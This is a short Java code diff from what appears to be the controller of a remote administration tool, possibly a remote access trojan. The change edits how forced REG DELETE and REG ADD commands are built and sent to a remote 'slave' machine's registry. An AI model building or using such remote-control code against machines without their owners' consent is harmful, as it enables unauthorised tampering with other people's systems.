@@ -286,7 +286,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 		int row = table.getSelectedRow();
 		if (row != -1) {
 			String val = table.getValueAt(row, 0).toString();
-			slave.addToSendQueue(new Packet80CustomRegQuery("U REG DELETE " + txt.getText() + "\\" + " /v " + val + " /f"));
+			slave.addToSendQueue(new Packet80CustomRegQuery("REG DELETE " + txt.getText() + "\\" + " /v " + val + " /f"));
 			reload();
 		}
 	}
@@ -301,7 +301,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 				return;
 			}
 
-			slave.addToSendQueue(new Packet80CustomRegQuery("U REG ADD " + txt.getText() + "\\ /v " + val + " /t " + type + " /d " + data + " /f"));
+			slave.addToSendQueue(new Packet80CustomRegQuery("REG ADD " + txt.getText() + "\\ /v " + val + " /t " + type + " /d " + data + " /f"));
 
 			reload();
 		}
